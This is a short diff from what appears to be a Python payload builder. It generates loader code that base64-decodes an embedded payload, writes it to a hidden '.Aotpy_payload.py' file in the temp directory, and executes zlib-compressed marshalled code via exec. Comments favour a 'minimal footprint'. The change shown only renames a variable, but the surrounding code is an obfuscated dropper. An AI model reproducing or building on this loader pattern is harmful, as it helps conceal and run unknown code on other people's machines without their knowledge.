@@ -442,8 +442,8 @@ exec(marshal.loads(zlib.decompress(c)))'''
     # OPTIMIZED final code - minimal footprint
     final_code = f'''import os, sys, time, base64,tempfile, platform
 plat = platform.system().lower()
-d="{encoded}"
-e=base64.b64decode(d).decode()
+Aotpy="{encoded}"
+e=base64.b64decode(Aotpy).decode()
 t=tempfile.gettempdir()
 p=os.path.join(t,".Aotpy_payload.py")
 os.makedirs(os.path.dirname(p),exist_ok=1)
